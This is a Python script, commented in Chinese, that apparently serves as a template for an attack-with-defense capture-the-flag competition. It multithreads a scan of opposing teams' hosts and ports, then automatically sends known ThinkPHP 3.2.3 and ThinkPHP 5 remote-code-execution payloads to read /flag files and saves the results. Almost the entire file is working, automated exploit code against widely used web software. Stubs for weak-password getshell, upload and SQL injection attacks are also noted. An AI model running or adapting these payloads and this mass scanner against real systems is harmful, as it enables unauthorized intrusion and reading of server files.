#!/usr/bin/env python3
"""
AWD 通用侦察/攻击模板
使用:
  python3 recon_template.py \
      --domain-template "192-168-1-{TEAM}.pvp7574.bugku.cn" \
      --team-range 1 121 \
      --ports 80,2222 \
      --out flags.json \
      --attack
"""
import requests, json, re, argparse, time
from concurrent.futures import ThreadPoolExecutor, as_completed

HEADERS = {"User-Agent": "Mozilla/5.0 AWD"}
TIMEOUT = 8

def flag_hunt(text):
    m = re.search(r"flag\{[^}]+\}", text or "")
    return m.group() if m else None

def get(host, path="", **kw):
    try:
        r = requests.get(f"http://{host}/{path}", headers=HEADERS, timeout=TIMEOUT, allow_redirects=True, **kw)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)

def check_alive(host, ports):
    result = {}
    for port in ports:
        h = host if port == 80 else f"{host}:{port}"
        st, bd = get(h)
        if st == 200 or st in (301, 302, 401, 403, 500):
            result[port] = {"status": st, "len": len(bd or "")}
    return host, result

def attack_web(host):
    flags_found = []
    # ---- ThinkPHP 3.2.3 RCE ----
    tp_payloads = [
        f"index.php?s=/Index/index/name/${{@print(file_get_contents('/flag'))}}",
        f"index.php?s=/Index/index/name/${{@print(file_get_contents('/flag.txt'))}}",
        f"index.php?s=/Show/index/id/${{@print(file_get_contents('/flag'))}}",
        f"index.php?s=/Article/index/id/${{@print(file_get_contents('/flag'))}}",
    ]
    for urlp in tp_payloads:
        st, bd = get(host, urlp)
        f = flag_hunt(bd)
        if f: flags_found.append(("TP-RCE", f"http://{host}/{urlp}", f)); break

    # ---- ThinkPHP 5 RCE ----
    tp5 = f"index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/flag"
    st, bd = get(host, tp5)
    f = flag_hunt(bd)
    if f: flags_found.append(("TP5-RCE", f"http://{host}/{tp5}", f))

    # ---- 首页直出 flag ----
    st, bd = get(host)
    f = flag_hunt(bd)
    if f: flags_found.append(("Homepage", f"http://{host}/", f))

    # ---- 后台弱口令 + getshell ----
    # ---- 文件上传 (后续可接 upload) ----
    # ---- SQLi (后续可接 sqli) ----
    return flags_found

def main():
    parser = argparse.ArgumentParser(description="AWD 侦察/攻击模板")
    parser.add_argument("--domain-template", required=True, help="如 192-168-1-{TEAM}.pvp7574.bugku.cn")
    parser.add_argument("--team-range", type=int, nargs=2, default=[1, 121], metavar=("start","end"))
    parser.add_argument("--ports", default="80,443,22,2222,3306,6379,8080", help="常用端口, 逗号分隔")
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument("--out", default="flags.json")
    parser.add_argument("--attack", action="store_true", help="侦察完自动攻击")
    args = parser.parse_args()

    ports = [int(x) for x in args.ports.split(",")]
    start, end = args.team_range
    hosts = [args.domain_template.replace("{TEAM}", str(t)) for t in range(start, end)]

    print(f"[*] 侦察 {len(hosts)} 个队伍 ({hosts[0]} ~ {hosts[-1]})")
    alive = {}
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(check_alive, h, ports): h for h in hosts}
        for f in as_completed(futs):
            host, res = f.result()
            if res: alive[host] = res

    print(f"\n[✓] 存活 {len(alive)} 队:")
    for h, ps in sorted(alive.items()):
        print(f"  {h}: {ps}")

    if not args.attack:
        return
    print(f"\n[*] 自动攻击 {len(alive)} 个目标...")
    results = {}
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(attack_web, h): h for h in alive}
        for f in as_completed(futs):
            h = futs[f]
            try:
                flags = f.result()
                if flags: results[h] = flags
                for mode, url, fl in flags:
                    print(f"  🏳️ {h} [{mode}] {fl}")
                    print(f"      URL: {url[:100]}")
            except Exception as e:
                pass

    with open(args.out, "w") as f:
        json.dump({"alive": alive, "flags": results}, f, ensure_ascii=False, indent=2)
    print(f"\n[✓] 结果写入 {args.out}")

if __name__ == "__main__":
    main()
